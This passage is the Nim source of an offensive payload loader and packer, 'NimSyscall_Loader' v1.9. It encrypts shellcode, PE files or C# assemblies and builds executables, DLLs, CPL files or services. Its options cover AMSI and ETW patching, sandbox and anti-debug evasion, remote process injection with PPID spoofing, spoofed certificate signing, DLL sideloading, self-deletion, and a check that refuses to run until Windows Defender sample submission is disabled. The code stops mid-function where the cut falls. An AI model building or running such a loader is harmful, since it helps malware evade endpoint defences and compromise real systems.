#[

    Author: Fabian Mosch, Twitter: @ShitSecure
    Inspiration from: https://github.com/icyguider/nimcrypt/blob/main/nimcrypt.nim
]#

import nimcrypto
import nimcrypto/sysrand
import strformat
import strutils
import sugar
import os
import osproc
import docopt
import random
import winim
import streams
when system.hostOS == "windows":
    import winim/clr except `[]`

import HellsgateStubs
import CustomEvasionStubs
import GetSyscallStubs
import SandboxStubs
import Whispers
import SleepyCryptSleep
import PELoad
import CurrentProcInject
import RemoteProcInject
import DInvoke
import Powershell
import AntiDebug


from system import io

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc rndStr(length: int): string =
  for _ in .. length:
    add(result, char(rand(int('a') .. int('z'))))

# When this function isn't called, all random functions are not random. (https://nim-lang.org/docs/random.html)
randomize()


let banner = """
    _   ___          _____                       ____     __                    __         
   / | / (_)___ ___ / ___/__  ________________ _/ / /    / /   ____  ____ _____/ /__  _____
  /  |/ / / __ `__ \\__ \/ / / / ___/ ___/ __ `/ / /    / /   / __ \/ __ `/ __  / _ \/ ___/
 / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                       /____/                   /_____/      --> @ShitSecure
                                                                 v1.9                                            

"""

echo banner

#Handle arguments

let helpmenu = """
NimSyscall_Loader v 1.9

Usage:
  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms>]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:

[general]

  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe/dll
  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
  --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --debug    Compiles the binary in debug mode
  --x86    Compiles an x86 binary
  --wow64    (Compiles a x86 binary that can be used by x64 CPUs)
  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
  --verbose    Prints output to the console (for troubleshooting purposes)
  --psout    Powershell Output format, reflectively loading the packed binary
    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
    --pslyrics    Add Lyrics as comments to avoid some more detections
  --sourceonly    Dont compile but just create the source code and compile command
  --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
  --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence

[Payload retrieval options]

  By default, the Loader will embed the Payload into the output file. There are two alternatives to this:  
  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve Payload from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
  --shellcodeURL shellcodeURL    URL to retrieve Payload from

[DLL options]

  --dll     Generate DLL instead of an executable
      --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
      --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
      --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
      --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
      --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
      --cpl    Generate a CPL file (Control Panel Applet) instead of an executable

[evasion]

  --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
  --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
  --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
  --sgn    Encode shellcode via SGN before encrypting it
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
  --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
  --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
  --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
                     Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
                     WindowChanges -> Checks, if the current Window has changed 7 or more times before executing the payload
        --domain targetdomain    Specify a domain for SandBox Evasion
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
  --sign    Sign the binary with a spoofed certificate
      --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
  --noAntidebug    Leave out AntiDebugger Checks
  --noDefaultSandBox    Leave out default Sandbox Checks
  --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
    --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
    --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint

[Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]

  --hellsgate    Retrieve Syscalls via Hellsgate technique
  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
        --jump    When using Syswhispers3, use the jumper_randomized technique

[shellcode specific]

  --shellcode    Encrypt shellcode to load it on runtime
  --dripallocate    Allocate memory Driploader style (multiple small memory chunks after another to avoid memory scans after ETWti/Kernel Callback triggers)
      --dripsleep 500    Sleep time in ms between each memory allocation (e.G. 500 milisec)
  --CallbackExecute    Execute shellcode via a custom Callback function
  --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
  --QueueApc    Instead of a direct Pointer or Thread Creation execute the Shellcode via NtQueueApcThread
  --noWait    Don't use 'WaitForSingleObject(-1,-1)' after local Injection but exit the process instead afterwards. If your Shellcode exits the Thread/Process itself, this will not have any effect.
  --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
      --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
      --parentProcess parentProcName    Name of the parent Process to spoof (PPID Spoofing)
      --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
      --remotepatchETW    Patch ETW in the remote process before shellcode execution

[PE Packing]

  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE

[C# assembly Packing]

  --csharp    Encrypt a C# assembly to load it on runtime
  --interactivePS    Load an interactive unmanaged Powershell Runspace (https://github.com/S3cur3Th1sSh1t-Sponsors/PwnPowershell)

"""

if (paramCount() == 0):
    echo helpmenu
    quit(0)
if (paramStr(1) == "-h"):
    echo helpmenu
    quit(0)

proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))

var 
    filename: string = ""
    packerPath = os.getAppDir()
    outfile: string = packerPath
    envkey: string = rndStr(rand(10..35))
    dll_out: bool = false
    dllfunc: string = ""
    dllexportfunctions: seq[string]
    dllhijack: bool = false
    dllclone: bool = false
    dllToClone: string = ""
    dllProxy: bool = false
    noNimMain: bool = false
    psout: bool = false
    uselyrics: bool = false
    psobfs: bool = false
    cpl: bool = false
    replaceNimMain: bool = false
    big: bool
    sourceonly: bool = false#
    service: bool = false
    remoteprocesses : seq[string]
    existingprocessInjection: bool = false
    targetdomain : string = ""
    processname: string = ""
    customspawnprocess: string = "RuntimeBroker.exe"
    parentProcess: string = ""
    spoofArgs: string = ""
    shellcodeFile: seq[string] = @["enc.blob"]
    scfile: string = ""
    retrieveFromFile: bool = false
    shellcodeURL: string = ""
    retrieveFromURL: bool = false
    sandboxcheckfmt: string = ""
    sandboxchecks: seq[string]
    sandbox: bool = false
    csharp: bool = false
    interactivePS: bool = false
    arguments: string = ""
    embeddedArguments : bool = false
    AMSI: bool = true
    oneShot: bool = true
    AMSIPatch: bool = false
    AMSIProviderPatch: bool = false
    AMSICreateSectionHook: bool = false
    ETW: bool = true
    ETWPatch: bool = false
    COMVARETW: bool = false
    shellcode: bool = true
    RWX: bool = false
    callbackexecute: bool = false
    wait: bool = true
    localCreateThread: bool = false
    localinject: bool = true
    unhook: bool = false
    verbose: bool = false
    blockDLLs: bool = false
    denim: bool = false
    llvm: bool = false
    gosleep: bool = false
    sleeptime: int = 0
    sleepinbetween: int = 0
    dripsleepinbetween: int = 0
    reflective: bool = false
    hide: bool = false
    apiHide: bool = false
    noArgs: bool = false
    peinject: bool = false
    peload: bool = false
    callobfs: bool = false
    hellsgate: bool = false
    syswhispers: bool = false
    jump: bool = false
    sgn: bool = false
    getfreshstub: bool = true
    selfdelete: bool = false
    remoteAMSIpatch: bool = false
    remoteETWpatch: bool = false
    replace: bool = false
    useQueueAPC: bool = false
    macPayloadString: string
    pump: bool = false
    pumpfmt: string = ""
    pumpargs: seq[string]
    debugMode: bool = false
    sign: bool = false
    signdomain: string = "www.microsoft.com"
    compileX86: bool = false
    wow64: bool = false
    noassembly: bool = false
    sleepycrypt: bool = false
    fluctuate: bool = false
    noDInvoke: bool = false
    metadata: bool = false
    antidebug: bool = true
    macPayload: bool = false
    defaultSandBoxChecks: bool = true
    remoteMapSection: bool = false
    remoteinject: bool = false
    jmpEntry: bool = false
    jmpEntryDLL: string = "ntdll.dll"
    jmpEntryFunction: string = "RtlpWow64CtxFromAmd64"
    dripallocate: bool = false

let args = docopt(helpmenu, version = "NimSyscall_Loader 1.9")

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"
  echo filename

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"

if args["--noDefaultSandBox"]:
    defaultSandBoxChecks = false

if args["--psout"]:
    psout = true
    reflective = true

if args["--psobfs"]:
    psobfs = true

if args["--pslyrics"]:
    uselyrics = true

if args["--sourceonly"]:
    sourceonly = true

if args["--arguments"]:
  let argsForPE = args["--arguments"]
  arguments = fmt"{argsForPE}"
  embeddedArguments = true

if args["--shellcode"]:
  shellcode = true
  csharp = false
  peload = false

if args["--RWX"]:
  RWX = true

if args["--CallbackExecute"]:
  callbackexecute = true

if args["--localCreateThread"]:
    localCreateThread = true

if args["--QueueApc"]:
    useQueueAPC = true
    localCreateThread = false

if args["--noWait"]:
    wait = false

if args["--jmpEntry"]:
    jmpEntry = true

if args["--jmpEntryDLL"]:
    let dllname = args["--jmpEntryDLL"]
    jmpEntryDLL = fmt"{dllname}"

if args["--jmpEntryFunc"]:
    let funcname = args["--jmpEntryFunc"]
    jmpEntryFunction = fmt"{funcname}"

if args["--dripallocate"]:
    dripallocate = true

if args["--dripsleep"]:
    dripsleepinbetween = parse_int($args["--dripsleep"])
    dripsleepinbetween = (dripsleepinbetween)

if args["--csharp"]:
  csharp = true
  shellcode = false
  peload = false

if args["--peload"]:
  peload = true
  shellcode = false
  csharp = false

if args["--PatchAMSI"]:
  AMSIPatch = true
  AMSI = false

if args["--PatchETW"]:
  ETWPatch = true
  ETW = false

if args["--shellcodeFile"]:
    retrieveFromFile = true
    let shellcodeFilestring = args["--shellcodeFile"]
    scfile = fmt"{shellcodeFilestring}"
    shellcodeFile = scfile.split(',')

if args["--shellcodeURL"]:
    retrieveFromURL = true
    shellcodeFile = @["WebserverPayload.bin"]
    let shellcodeURLstring = args["--shellcodeURL"]
    shellcodeURL = fmt"{shellcodeURLstring}"

if args["--dll"]:
  dll_out = true
  if peload == true:
    echo "Warning: Argument passing to the PE will fail as the first argument is rundll32.exe or regsvr32.exe"

if args["--dllexportfunc"]:
  let dllfuncstring = args["--dllexportfunc"]
  dllfunc = fmt"{dllfuncstring}"
  dllexportfunctions = dllfunc.split(',')

if args["--dllhijack"]:
  dllhijack = true
  dll_out = true

if args["--dllProxy"]:
  dllProxy = true
  dllhijack = true
  dll_out = true

if args["--noNimMain"]:
  noNimMain = true

if args["--clone"]:
    dllclone = true
    dll_out = true
    # NetClone will only work, when DllMain is exposed and leading to NimMain
    dllhijack = true
    let cloneDLL = args["--clone"]
    dllToClone = fmt"{cloneDLL}"

if args["--cpl"]:
  dllhijack = true
  dll_out = true
  cpl = true


if args["--interactivePS"]:
    csharp = true
    interactivePS = true
    shellcode = false
    peload = false

var customLoaderName: string = rndStr(rand(5..15))

when system.hostOS == "windows":
    if(dll_out):
        outfile.add(fmt"\\{customLoaderName}.dll")
    elif(cpl):
        outfile.add(fmt"\\{customLoaderName}.cpl")
    else:
        outfile.add(fmt"\\{customLoaderName}.exe")
else:
    if(dll_out):
        outfile.add(fmt"/{customLoaderName}.dll")
    elif(cpl):
        outfile.add(fmt"/{customLoaderName}.cpl")
    else:
        outfile.add(fmt"/{customLoaderName}.exe")

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"

if args["--metadata"]:
  metadata = true

if args["--remotepatchAMSI"]:
  remoteAMSIpatch = true

if args["--remotepatchETW"]:
  remoteETWpatch = true

if args["--mapSection"]:
  remoteMapSection = true

if args["--noAMSI"]:
  AMSI = false

if args["--AMSIProviderPatch"]:
  AMSIProviderPatch = true
  AMSI = false

if args["--AMSINtCreateSectionHook"]:
  AMSICreateSectionHook = true
  AMSI = false

if args["--noETW"]:
  ETW = false

if args["--large"]:
  big = true

if args["--COMVARETW"]:
  COMVARETW = true

if args["--unhook"]:
  unhook = true

if args["--sleep"]:
  sleeptime = parse_int($args["--sleep"])
  sleeptime = (sleeptime)
  gosleep = true

if args["--sleep-in-between"]:
    sleepinbetween = parse_int($args["--sleep-in-between"])
    sleepinbetween = (sleepinbetween)
    gosleep = true
    
if args["--remoteinject"]:
  localinject = false
  remoteinject = true

if args["--blockDLLs"]:
    blockDLLs = true

if args["--customprocess"]:
  let customprocargs = args["--customprocess"]
  customspawnprocess = fmt"{customprocargs}"

if args["--spoofArgs"]:
  let customSpoofArgs = args["--spoofArgs"]
  spoofArgs = fmt"{customSpoofArgs}"

if args["--parentProcess"]:
    let parProc = args["--parentProcess"]
    parentProcess = fmt"{parProc}"

if args["--remoteprocess"]:
  let remoteprocessesstring = args["--remoteprocess"]
  processname = fmt"{remoteprocessesstring}"
  echo processname
  remoteprocesses = processname.split(',')
  echo remoteprocesses
  existingprocessInjection = true

if args["--reflective"]:
  reflective = true

if args["--obfuscate"]:
  denim = true

if args["--macPayload"]:
  macPayload = true

if args["--sign"]:
    sign = true

if args["--signdomain"]:
    let signarg = args["--signdomain"]
    signdomain = fmt"{signarg}"

if args["--llvm"]:
  llvm = true

if args["--sleepycrypt"]:
    sleepycrypt = true

if args["--fluctuate"]:
    fluctuate = true

if args["--hide"]:
  hide = true

if args["--APIhide"]:
  apihide = true
  hide = false

if args["--noArgs"]:
  noArgs = true

if args["--peinject"]:
  peinject = true

if args["--hellsgate"]:
  hellsgate = true
  getfreshstub = false

if args["--syswhispers"]:
  syswhispers = true
  getfreshstub = false

if args["--jump"]:
  syswhispers = true
  jump = true

if args["--sgn"]:
  sgn = true
  RWX = true

if args["--replace"]:
  replace = true

if args["--sandbox"]:
  sandbox = true
  let sandboxchecksargs = args["--sandbox"]
  sandboxcheckfmt = fmt"{sandboxchecksargs}"
  sandboxchecks = sandboxcheckfmt.split(',') 

if args["--pump"]:
  pump = true
  let pumptempargs = args["--pump"]
  pumpfmt = fmt"{pumptempargs}"
  pumpargs = pumpfmt.split(',') 

if args["--domain"]:
  let domainarg = args["--domain"]
  targetdomain = fmt"{domainarg}"

if args["--self-delete"]:
  selfdelete = true

if args["--obfuscatefunctions"]:
  callobfs = true

if args["--debug"]:
  debugMode = true

if args["--noAntidebug"]:
  antidebug = false

if args["--x86"]:
  compileX86 = true
  noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.

if args["--wow64"]:
    wow64 = true
    compileX86 = true
    noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.

if args["--verbose"]:
  verbose = true

if args["--service"]:
    service = true
    verbose = false

if args["--noDInvoke"]:
  noDInvoke = true

var blob: string

if ((compileX86 or wow64) and hellsgate):
    echo "Error: Hellsgate is not supported for x86 yet"
    if (wow64):
        echo "Only syswhispers (without Jump) supports wow64 till now"
    quit(1)

if (wow64 and syswhispers and jump):
    echo "Error: Syswhispers (Jump) cannot be used in combination with wow64"
    quit(1)

if (wow64 and getfreshstub):
    echo "Error: GetSyscallStub cannot be used in combination with wow64 yet"
    if (wow64):
        echo "Only Syswhispers (without Jump) supports wow64 till now"
    quit(1)

if (useQueueAPC and remoteinject and syswhispers):
    echo "Error: QueueUserAPC not implemented for remote injection with Syswhispers yet. Only Hellsgate and GetSyscallStub."
    quit(1)

#if (remoteMapSection and dripallocate):
#    echo "Error: Cannot use both --mapSection and --dripallocate, not implemented yet"
#    quit(1)

if (peload and dripallocate):
    echo "Error: Cannot use both --peload and --dripallocate, not implemented yet"
    quit(1)

if (noArgs and embeddedArguments):
    echo "Error: Cannot use both --noArgs and --arguments"
    quit(1)
if (peinject and peload):
    echo "Error: Cannot use both --peinject and --peload"
    quit(1)

if (syswhispers and hellsgate):
    echo "Error: Cannot use both --syswhispers and --hellsgate"
    quit(1)

if (hellsgate and jump):
    echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
    quit(1)

if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
    echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
    quit(1)

if (dllclone and dllProxy):
    echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
    quit(1)

if((existingprocessInjection == false) and (remoteinject) and jmpEntry):
    if (jmpEntryDll != "ntdll.dll"):
        echo "Error: You can only use ntdll.dll functions for SpawnInject, because the Process is suspended and only ntdll.dll is loaded. Other DLLs can only be used when using --remoteprocess for Processes, that already have the target DLL loaded!"
        quit(1)

if (psout and dll_out):
    # Reflective DLL PE-Loading only works, when DLLMain is exposed, otherwise it won't work
    dllhijack = true

if(service):
    # For some reason, started services have the being debugged flag set or this check breaks the service, so we disable it
    antidebug = false


#echo "Key: " & envkey
# Lets save the last 4 characters of the string in a new variable
var lastTwo = envkey[^2..^1]
var fourthtosecondlast = envkey[^4..^3]
var lastFour = envkey[^4..^1]
#echo "Last Four: " & lastFour
#echo "lastTwo: " & lastTwo
#echo "fourthtosecondlast: " & fourthtosecondlast
# And save a key without those last 4 characters in a new one
var firstwithoutlast4 = envkey.replace(lastFour, "")
#echo "First without last 4 :" & firstwithoutlast4

if (peload and embeddedArguments):
    verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments

when system.hostOS == "windows":
    var sampleSubmissionValue = execCmdEx("powershell.exe $mpPreference = Get-MpPreference; if ($mpPreference.SubmitSamplesConsent -in 0, 1, 3) { Write-Host 'Enabled' }")
    echo "[*] Checking Windows Defender Sample Submission..."
    echo "[*] Windows Defender Sample Submission is: " & sampleSubmissionValue[0]
    if (sampleSubmissionValue[0].contains("Enabled")):
        echo "[-] Windows Defender Sample Submission is enabled. Please disable it!"
        quit(1)


if (peload or peinject):
    let stream = newFileStream(filename, mode = fmRead)
    defer: stream.close()
    # Check magic string
    var magic_string: array[2, char]
    discard stream.readData(magic_string.addr, 2)
    if magic_string != "MZ":
        echo "[-] No Magic bytes found, file is not a PE"
        quit(1)
when system.hostOS == "windows":
    if (csharp):
        if (interactivePS):
            var newPath = packerPath & "\\pwnPowershell\\RunSpace.exe"
            blob = readFile(newPath)
        else:
            blob = readFile(filename)
            var blobbytes = toByteSeq(blob)
            var code = fmt"""
            using System;
            public class Check {{
              public void ifAssembly() {{
                object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
              }}
            }}
            """
            try:
                var res = compile(code)
                var o = res.CompiledAssembly.new("Check")
                o.ifAssembly()
            except:
                echo "[-] Error - you didn't specify a C# assembly!"
                noassembly = true

            if (noassembly):
                quit(1)
else:
    # Temporary fix for error using --csharp in linux (and Docker image).
    # We get an IndexDefect error because 'blob' is never set, so we set it here when in linux
    # Probably need to the linux way of checking the C# assembly in here, somehow.
    blob = readFile(filename)
    # End temp fix
    if (interactivePS):
        var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
        blob = readFile(newPath)

#if (AMSICreateSectionHook):
#    echo "Not fully working yet, sorry!"
    #quit(0)

#Read file and if PE convert to shellcode before
if (peinject):
    when system.hostOS == "windows":
        var exist: bool = fileExists(fmt"{packerPath}\donut\donut.exe")
    else:
        var exist: bool = true
    if (exist):
        when system.hostOS == "windows":
            if (embeddedArguments):
                echo "Donut command: "
                echo fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}"
                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}")
            else:
                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
            if (sgn):
                if (compileX86):
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 8  -o tmpshellcode.bin tmpshellcode.bin")
                else:
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 8  -o tmpshellcode.bin tmpshellcode.bin")
                sgn = false
        elif system.hostOS == "linux":
            if(embeddedArguments):
                echo "Donut command: "
                echo fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin"
                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin")
            else:
                echo "Donut command: "
                echo fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin"
                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
            if (sgn):
                if (compileX86):
                    discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                else:
                    discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                sgn = false
        blob = readFile("tmpshellcode.bin")
        shellcode = true
        peload = false
    else:
        echo fmt"'Donut' not found. You need to download/install according to the README"
        quit()
elif(sgn):
    if (compileX86):
        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 8  -o tmpshellcode.bin {filename}")
    else:
        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 8  -o tmpshellcode.bin {filename}")
    blob = readFile("tmpshellcode.bin")
elif(csharp == false):
    blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)

    ectx: ECB[aes256]
    key: array[aes256.sizeKey, byte]

# AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
if ((len(data) mod aes256.sizeBlock) != 0):
    echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
    echo "[*] Length: " & $len(data)
    echo "[*] Padding payload..."
    data = data & newSeq[byte](aes256.sizeBlock - (len(data) mod aes256.sizeBlock))
    echo "[*] New Length: " & $len(data)
    
var
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))


copyMem(addr plaintext[0], addr data[0], len(data))
echo "[*] Plaintext length: " & $len(plaintext)
echo "[*] Enctext length: " & $len(enctext)

# Convert Key to byte sequence
var expandedkey = toByteSeq(envkey)


# AES256 key size is 256 bits or 32 bytes, so we need to pad key with
# 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
if ((len(expandedkey) mod (aes256.sizeBlock * 2)) != 0):
    echo "[*] Key length not a multiple of KeySize: ", (aes256.sizeBlock * 2)
    echo "[*] Length: " & $len(expandedkey)
    echo "[*] Padding Key..."
    expandedkey = expandedkey & newSeq[byte]((aes256.sizeBlock * 2) - (len(expandedkey) mod (aes256.sizeBlock * 2)))
    # Length cannot be > 32 bytes
    if (len(expandedkey) > (aes256.sizeBlock * 2)):
        expandedkey = expandedkey[0..(aes256.sizeBlock * 2) - 1]
        echo "[*] New New Length: " & $len(expandedkey)

copyMem(addr key[0], addr expandedkey[0], len(expandedkey))
ectx.init(key)
ectx.encrypt(plaintext, enctext)
ectx.clear()

echo "Writing encrypted blob to disk: "

var content: string = cast[string](enctext)
writeFile(shellcodeFile[0], content)

if(macPayload):
    echo "[*] Converting Shellcode to MAC-Adresses: "
    echo fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}"
    when system.hostOS == "linux":
        macPayloadString = exec_cmd_ex(fmt"{packerPath}/bin2mac/bin2mac.py {packerPath}/{shellcodeFile[0]}")[0]
    when system.hostOS == "windows":
        macPayloadString = exec_cmd_ex(fmt"{packerPath}\bin2mac\bin2mac.exe {packerPath}\{shellcodeFile[0]}")[0]
    #echo macPayloadString


if(AMSICreateSectionHook):
    echo "\r\n[*] Encrypting NtCreateSection-Hook Shellcode: \r\n"
    var
        data2: seq[byte] = toByteSeq(readFile("hook.bin"))

        ectx2: ECB[aes256]
    
    # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
    # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
    if ((len(data2) mod aes256.sizeBlock) != 0):
        echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
        echo "[*] Length: " & $len(data2)
        echo "[*] Padding payload..."
        data2 = data2 & newSeq[byte](aes256.sizeBlock - (len(data2) mod aes256.sizeBlock))
        echo "[*] New Length: " & $len(data2)
        
    var
        plaintext2 = newSeq[byte](len(data2))
        enctext2 = newSeq[byte](len(data2))

    copyMem(addr plaintext2[0], addr data2[0], len(data2))
    echo "[*] Plaintext length: " & $len(plaintext2)
    echo "[*] Enctext length: " & $len(enctext2)

    ectx2.init(key)
    ectx2.encrypt(plaintext2, enctext2)
    ectx2.clear()

    echo "Writing encrypted Hook-blob to disk: "

    var content2: string = cast[string](enctext2)
    writeFile("enchook.blob", content2)

proc getRandStub (): string =
  var randName: string = rndStr(rand(10..25))
